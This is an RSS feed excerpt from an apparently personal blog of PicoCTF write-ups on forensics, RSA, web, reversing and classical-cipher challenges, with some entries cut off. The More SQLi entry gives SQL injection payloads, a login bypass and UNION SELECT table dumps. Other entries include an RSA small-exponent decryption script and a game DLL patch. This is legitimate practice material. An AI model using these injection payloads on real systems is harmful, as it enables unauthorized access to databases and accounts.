 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://fileinfo.com/extension/pptm">What is a PPTM file?&lt;/a>
&lt;font color="FF0000">It&amp;rsquo;s a zip format file&lt;/font>&lt;/p>
&lt;blockquote>
&lt;p>A PPTM file is a macro-enabled presentation created by Microsoft PowerPoint, an application used to create presentations and slide shows. It contains a collection of slides, which typically includes text, layout, images, and embedded macros. PPTM files are commonly used to store business, marketing, and academic presentations.&lt;/p></description></item><item><title>PicoCTF - Matryoshka doll</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/</guid><description>&lt;h1 id="picoctf---matryoshka-doll">
 PicoCTF - Matryoshka doll
 &lt;a class="anchor" href="#picoctf---matryoshka-doll">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/129?category=4&amp;amp;page=1">&lt;/a>&lt;/p>
&lt;h2 id="exploit---rar-in-rar">
 Exploit - &lt;code>rar&lt;/code> in &lt;code>rar&lt;/code>
 &lt;a class="anchor" href="#exploit---rar-in-rar">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Hint
The hint said:&lt;/p>
&lt;blockquote>
&lt;p>Wait, you can hide files inside files? But how do you find them?&lt;/p>&lt;/blockquote>
&lt;p>So&amp;hellip;I tried &lt;code>stegsolve&lt;/code>, &lt;code>HxD&lt;/code>, &lt;code>exiftool&lt;/code>, &lt;code>string dolls.jpg | grep &amp;quot;{&amp;quot;&lt;/code>, &lt;code>$ zsteg dolls.jpg&lt;/code> &amp;hellip; All these are in vain&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;font color="FF0000">通靈&lt;/font>: Changed the extension to &lt;code>.rar&lt;/code>
And it can be uncompressed
&lt;img src="https://i.imgur.com/sNfhE2J.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Repeat until find &lt;code>flag.txt&lt;/code>&amp;hellip;&lt;/p></description></item><item><title>PicoCTF - Mind your Ps and Qs</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/</guid><description>&lt;h1 id="picoctf---mind-your-ps-and-qs">
 PicoCTF - Mind your Ps and Qs
 &lt;a class="anchor" href="#picoctf---mind-your-ps-and-qs">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/162?category=2&amp;amp;page=1">Mind your Ps and Qs&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10250721">RSA (觀念篇) &lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-txt" data-lang="txt">&lt;span style="display:flex;">&lt;span>Decrypt my super sick RSA:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c: 421345306292040663864066688931456845278496274597031632020995583473619804626233684
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n: 631371953793368771804570727896887140714495090919073481680274581226742748040342637
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>e: 65537
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit---find-p--q-by-online-tool">
 Exploit - Find P &amp;amp; Q By &lt;a href="https://www.alpertron.com/ECM.HTM">Online Tool&lt;/a>
 &lt;a class="anchor" href="#exploit---find-p--q-by-online-tool">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Find P &amp;amp; Q
Use online tool to do prime factorize on &lt;code>n&lt;/code>
p $\to$ 1461849912200000206276283741896701133693
q $\to$ 431899300006243611356963607089521499045809&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Write exploit&lt;/p></description></item><item><title>PicoCTF - Mini RSA</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/</guid><description>&lt;h1 id="picoctf---mini-rsa">
 PicoCTF - Mini RSA
 &lt;a class="anchor" href="#picoctf---mini-rsa">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/188?category=2&amp;amp;page=1">Mini RSA&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>N: &lt;span style="color:#ae81ff">1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>e: &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ciphertext &lt;span style="color:#f92672">(&lt;/span>c&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit---small-e-attack">
 Exploit - Small &lt;code>e&lt;/code> attack
 &lt;a class="anchor" href="#exploit---small-e-attack">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import gmpy2
from Crypto.Util.number import long_to_bytes


N = 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287
e = 3
c = 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106

k = 1
while True:
 if gmpy2.iroot(c + N * k, 3)[1]==1:
 res=gmpy2.iroot(c + N * k, 3)[0] 
 print(k, res)
 print(long_to_bytes(res))
 break
 k += 1
&lt;/code>&lt;/pre>&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://zhuanlan.zhihu.com/p/76228394">CTF_RSA解密学习指南(三) - e=3 小明文攻击&lt;/a>&lt;/p></description></item><item><title>PicoCTF - More SQLi</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---more-sqli/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---more-sqli/</guid><description>&lt;h1 id="picoctf---more-sqli">
 PicoCTF - More SQLi
 &lt;a class="anchor" href="#picoctf---more-sqli">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lab.feifei.tw/practice/sqli/sql4.php">Feifei Lab&lt;/a>&lt;/li>
&lt;li>Hint SQLiLite&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>先隨便輸入發現他很貼心有給完整的payload，發現他是先檢查password，在沒有任何防護的情況下，直接用最經典的payload就可了
Account: Any
Password: &lt;code>' or '1'='1' -- #&lt;/code>
&lt;img src="https://hackmd.io/_uploads/rJXd-oLd3.png" alt="" />&lt;/p>
&lt;hr>
&lt;p>&lt;img src="https://hackmd.io/_uploads/Bki0WoLd3.png" alt="" />&lt;/p>
&lt;h2 id="exploit---sqliunion-selection">
 Exploit - SQLi(Union Selection)
 &lt;a class="anchor" href="#exploit---sqliunion-selection">#&lt;/a>
&lt;/h2>
&lt;p>現在的目標是flag應該是藏在別的table，所以先找甚麼table&lt;/p>
&lt;ol>
&lt;li>
&lt;p>找table
透過&lt;a href="https://github.com/w181496/Web-CTF-Cheatsheet#sqlite">Kaibro的cheat sheet&lt;/a>，SQLite的爆破payload是&lt;code>SELECT name FROM sqlite_master WHERE type='table'&lt;/code>，而目前我們可以用union based的方式搜尋，先觀察搜尋&lt;code>Algiers&lt;/code>的搜尋column有三個，第一個column是chr，第二個column是chr，第三個是int，所以在用union select的時候要遵守&lt;font color="FF0000">&lt;strong>查詢數量一樣、每個欄位的型態一樣&lt;/strong>&lt;/font>
Payload: &lt;code>Algiers' union SELECT sql,sql,1 FROM sqlite_master WHERE type='table'; --&lt;/code>
:::spoiler Screenshot
&lt;img src="https://hackmd.io/_uploads/rk9G4oLO2.png" alt="" />
:::&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Find Flag - Union based
目前發現有兩個table比較可疑&lt;/p>
&lt;ul>
&lt;li>CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)&lt;/li>
&lt;li>CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)&lt;/li>
&lt;/ul>
&lt;p>可以直接用前面同樣的方式找flag，觀察這個table只有兩個column，且一個column的type是int，另外一個是text，而第三個column就隨便填
Payload: &lt;code>Algiers' union SELECT id,flag,1 FROM more_table; --&lt;/code>
:::spoiler Screenshot
&lt;img src="https://hackmd.io/_uploads/ryonEoIdn.png" alt="" />
:::
Flag: &lt;code>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Most Cookies</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---most-cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---most-cookies/</guid><description>&lt;h1 id="picoctf---most-cookies">
 PicoCTF - Most Cookies
 &lt;a class="anchor" href="#picoctf---most-cookies">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://vocus.cc/article/634c1c7efd89780001237de9">Python Flask session 學習心得&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open(&amp;#34;./flag&amp;#34;).read().rstrip()
title = &amp;#34;Most Cookies&amp;#34;
cookie_names = [&amp;#34;snickerdoodle&amp;#34;, &amp;#34;chocolate chip&amp;#34;, &amp;#34;oatmeal raisin&amp;#34;, &amp;#34;gingersnap&amp;#34;, &amp;#34;shortbread&amp;#34;, &amp;#34;peanut butter&amp;#34;, &amp;#34;whoopie pie&amp;#34;, &amp;#34;sugar&amp;#34;, &amp;#34;molasses&amp;#34;, &amp;#34;kiss&amp;#34;, &amp;#34;biscotti&amp;#34;, &amp;#34;butter&amp;#34;, &amp;#34;spritz&amp;#34;, &amp;#34;snowball&amp;#34;, &amp;#34;drop&amp;#34;, &amp;#34;thumbprint&amp;#34;, &amp;#34;pinwheel&amp;#34;, &amp;#34;wafer&amp;#34;, &amp;#34;macaroon&amp;#34;, &amp;#34;fortune&amp;#34;, &amp;#34;crinkle&amp;#34;, &amp;#34;icebox&amp;#34;, &amp;#34;gingerbread&amp;#34;, &amp;#34;tassie&amp;#34;, &amp;#34;lebkuchen&amp;#34;, &amp;#34;macaron&amp;#34;, &amp;#34;black and white&amp;#34;, &amp;#34;white chocolate macadamia&amp;#34;]
app.secret_key = random.choice(cookie_names)

@app.route(&amp;#34;/&amp;#34;)
def main():
	if session.get(&amp;#34;very_auth&amp;#34;):
		check = session[&amp;#34;very_auth&amp;#34;]
		if check == &amp;#34;blank&amp;#34;:
			return render_template(&amp;#34;index.html&amp;#34;, title=title)
		else:
			return make_response(redirect(&amp;#34;/display&amp;#34;))
	else:
		resp = make_response(redirect(&amp;#34;/&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
		return resp

@app.route(&amp;#34;/search&amp;#34;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])
def search():
	if &amp;#34;name&amp;#34; in request.form and request.form[&amp;#34;name&amp;#34;] in cookie_names:
		resp = make_response(redirect(&amp;#34;/display&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = request.form[&amp;#34;name&amp;#34;]
		return resp
	else:
		message = &amp;#34;That doesn&amp;#39;t appear to be a valid cookie.&amp;#34;
		category = &amp;#34;danger&amp;#34;
		flash(message, category)
		resp = make_response(redirect(&amp;#34;/&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
		return resp

@app.route(&amp;#34;/reset&amp;#34;)
def reset():
	resp = make_response(redirect(&amp;#34;/&amp;#34;))
	session.pop(&amp;#34;very_auth&amp;#34;, None)
	return resp

@app.route(&amp;#34;/display&amp;#34;, methods=[&amp;#34;GET&amp;#34;])
def flag():
	if session.get(&amp;#34;very_auth&amp;#34;):
		check = session[&amp;#34;very_auth&amp;#34;]
		if check == &amp;#34;admin&amp;#34;:
			resp = make_response(render_template(&amp;#34;flag.html&amp;#34;, value=flag_value, title=title))
			return resp
		flash(&amp;#34;That is a cookie! Not very special though...&amp;#34;, &amp;#34;success&amp;#34;)
		return render_template(&amp;#34;not-flag.html&amp;#34;, title=title, cookie_name=session[&amp;#34;very_auth&amp;#34;])
	else:
		resp = make_response(redirect(&amp;#34;/&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
		return resp

if __name__ == &amp;#34;__main__&amp;#34;:
	app.run()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - mus1c</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---mus1c/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---mus1c/</guid><description>&lt;h1 id="picoctf---mus1c">
 PicoCTF - mus1c
 &lt;a class="anchor" href="#picoctf---mus1c">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-general-skill">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>General Skill&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-general-skill">#&lt;/a>
&lt;/h6>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Lyrics&lt;/p>
&lt;pre tabindex="0">&lt;code>Pico&amp;#39;s a CTFFFFFFF
my mind is waitin
It&amp;#39;s waitin

Put my mind of Pico into This
my flag is not found
put This into my flag
put my flag into Pico


shout Pico
shout Pico
shout Pico

My song&amp;#39;s something
put Pico into This

Knock This down, down, down
put This into CTF

shout CTF
my lyric is nothing
Put This without my song into my lyric
Knock my lyric down, down, down

shout my lyric

Put my lyric into This
Put my song with This into my lyric
Knock my lyric down

shout my lyric

Build my lyric up, up ,up

shout my lyric
shout Pico
shout It

Pico CTF is fun
security is important
Fun is fun
Put security with fun into Pico CTF
Build Fun up
shout fun times Pico CTF
put fun times Pico CTF into my song

build it up

shout it
shout it

build it up, up
shout it
shout Pico
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - New Caesar</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---new-caesar/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---new-caesar/</guid><description>&lt;h1 id="picoctf---new-caesar">
 PicoCTF - New Caesar
 &lt;a class="anchor" href="#picoctf---new-caesar">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/158?category=2&amp;amp;page=1">New Caesar&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>::: spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import string

LOWERCASE_OFFSET = ord(&amp;#34;a&amp;#34;)
ALPHABET = string.ascii_lowercase[:16]

def b16_encode(plain):
	enc = &amp;#34;&amp;#34;
	for c in plain:
		binary = &amp;#34;{0:08b}&amp;#34;.format(ord(c))
		enc += ALPHABET[int(binary[:4], 2)]
		enc += ALPHABET[int(binary[4:], 2)]
	return enc

def shift(c, k):
	t1 = ord(c) - LOWERCASE_OFFSET
	t2 = ord(k) - LOWERCASE_OFFSET
	return ALPHABET[(t1 + t2) % len(ALPHABET)]

flag = &amp;#34;redacted&amp;#34;
key = &amp;#34;redacted&amp;#34;
assert all([k in ALPHABET for k in key])
assert len(key) == 1

b16 = b16_encode(flag)
enc = &amp;#34;&amp;#34;
for i, c in enumerate(b16):
	enc += shift(c, key[i % len(key)])
print(enc)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - No Padding, No Problem</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/</guid><description>&lt;h1 id="picoctf---no-padding-no-problem">
 PicoCTF - No Padding, No Problem
 &lt;a class="anchor" href="#picoctf---no-padding-no-problem">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;p>Oracles can be your best friend, they will decrypt anything, except the flag&amp;rsquo;s ciphertext. How will you break it? Connect with nc mercury.picoctf.net 10333.&lt;/p>
&lt;h2 id="hint">
 Hint
 &lt;a class="anchor" href="#hint">#&lt;/a>
&lt;/h2>
&lt;p>What can you do with a different pair of ciphertext and plaintext? What if it is not so different after all&amp;hellip;&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>We can try to decrypt ciphertext directly.&lt;/p></description></item><item><title>PicoCTF - No way out</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---no-way-out/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---no-way-out/</guid><description>&lt;h1 id="picoctf---no-way-out">
 PicoCTF - No way out
 &lt;a class="anchor" href="#picoctf---no-way-out">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>C Sharp / dn.spy / cheat engine&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>大概有三種解法，其中兩種是改變.dll中的內容，有點利用binary exploitation的方式顯示flag，另外一種就是利用cheat engine的方式找到儲存座標的memory然後手動改寫數值，就拿到flag&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;h3 id="method-1---change-dll">
 Method 1 - Change .dll
 &lt;a class="anchor" href="#method-1---change-dll">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>可以看到&lt;code>No way out/pico_Data/Managed/Assembly-CSharp.dll&lt;/code>可能是一個可以用dn.spy decompile的文件，先看看有沒有甚麼可以更改的&lt;/p>
&lt;/li>
&lt;li>
&lt;p>在APTX class中，一個Mysterious的member，而且當&lt;code>collision.gameObject == this.player&lt;/code>是true的時候，&lt;code>this.Mysterious.SetActive(true);&lt;/code>就會被trigger，所以這就有點像是我們在遊戲中，如果要碰到白色旗子的時候會觸發的statement，那如果我在初始化的階段就直接把&lt;code>this.Mysterious.SetActive(true);&lt;/code>設定成true，是不是就可以直接拿直到flag?
&lt;img src="https://hackmd.io/_uploads/rylVM-rah.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Implementation
直接右鍵edit class變成多加一個Start() method，然後不用任何的條件就達到剛剛說的效果，切記一定要是Start，因為Start是有被實際呼叫的method，如果取個aaa這種名字，他本來就不會被呼叫，那改成這樣也沒意義，當然，也可以取其他會被呼叫到的method name，例如Update, Awake之類的
&lt;img src="https://hackmd.io/_uploads/rJ-UNZBp3.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/Hy_pE-HT2.png" alt="" />&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="method-2---change-dll">
 Method 2 - Change .dll
 &lt;a class="anchor" href="#method-2---change-dll">#&lt;/a>
&lt;/h3>
&lt;p>當然記得能改動.dll的method，我們也可以改變遊戲角色跳不過圍牆的問題，最直觀的作法是我可以直接無限制的往上跳，超過圍牆就抵達flag，不會只有跳一小段這個問題，可以查看一下&lt;code>EvolveGames/PlayerController/Update()&lt;/code>這個method，其中的第51行&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-csharp!" data-lang="csharp!">if (Input.GetButton(&amp;#34;Jump&amp;#34;) &amp;amp;&amp;amp; this.canMove &amp;amp;&amp;amp; this.characterController.isGrounded &amp;amp;&amp;amp; !this.isClimbing)
{
 this.moveDirection.y = this.jumpSpeed;
}
&lt;/code>&lt;/pre>&lt;p>如果改成&lt;/p></description></item><item><title>PicoCTF - not crypto</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---not-crypto/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---not-crypto/</guid><description>&lt;h1 id="picoctf---not-crypto">
 PicoCTF - not crypto
 &lt;a class="anchor" href="#picoctf---not-crypto">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Pseudo Source COde&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">__int64 __fastcall main(int a1, char **a2, char **a3)
{
 __int128 *v4; // rax
 unsigned __int8 v5; // di
 unsigned __int8 v6; // si
 unsigned __int8 v7; // cl
 unsigned __int8 v8; // dl
 unsigned int v9; // r8d
 unsigned __int8 v10; // r11
 int v16; // eax
 __int64 v17; // rdx
 unsigned int v18; // r12d
 char *v20; // r15
 unsigned __int8 v25; // r8
 int v30; // esi
 unsigned __int8 v32; // r12
 unsigned __int8 v36; // r14
 unsigned __int8 v38; // dl
 unsigned __int8 v40; // cl
 char v42; // r12
 char v43; // r14
 char v44; // al
 __int64 v45; // r13
 unsigned __int8 v46; // r10
 unsigned __int8 v47; // bp
 unsigned __int8 v48; // bl
 unsigned __int8 v49; // r8
 unsigned __int8 v50; // r11
 char v51; // dl
 char v54; // r10
 __int64 v63; // rdx
 char v72; // al
 unsigned __int8 v84; // [rsp+Ah] [rbp-1FEh]
 unsigned __int8 v85; // [rsp+Bh] [rbp-1FDh]
 int v86; // [rsp+Ch] [rbp-1FCh]
 int v87; // [rsp+10h] [rbp-1F8h]
 unsigned __int8 v88; // [rsp+14h] [rbp-1F4h]
 unsigned __int8 v89; // [rsp+15h] [rbp-1F3h]
 unsigned __int8 v90; // [rsp+16h] [rbp-1F2h]
 unsigned __int8 v91; // [rsp+17h] [rbp-1F1h]
 unsigned __int8 v92; // [rsp+18h] [rbp-1F0h]
 unsigned __int8 v93; // [rsp+19h] [rbp-1EFh]
 unsigned __int8 v94; // [rsp+1Ah] [rbp-1EEh]
 unsigned __int8 v95; // [rsp+1Bh] [rbp-1EDh]
 unsigned __int8 v96; // [rsp+1Ch] [rbp-1ECh]
 char v97; // [rsp+1Dh] [rbp-1EBh]
 char *v98; // [rsp+20h] [rbp-1E8h]
 unsigned __int8 v99; // [rsp+2Ah] [rbp-1DEh]
 char v100; // [rsp+50h] [rbp-1B8h]
 char v101; // [rsp+52h] [rbp-1B6h]
 char v102; // [rsp+54h] [rbp-1B4h]
 char v103; // [rsp+56h] [rbp-1B2h]
 char v104; // [rsp+58h] [rbp-1B0h]
 char v105; // [rsp+5Ah] [rbp-1AEh]
 char v106; // [rsp+5Ch] [rbp-1ACh]
 char v107; // [rsp+5Eh] [rbp-1AAh]
 __int128 v108; // [rsp+60h] [rbp-1A8h]
 char ptr[64]; // [rsp+70h] [rbp-198h] BYREF
 __int128 v110; // [rsp+B0h] [rbp-158h] BYREF
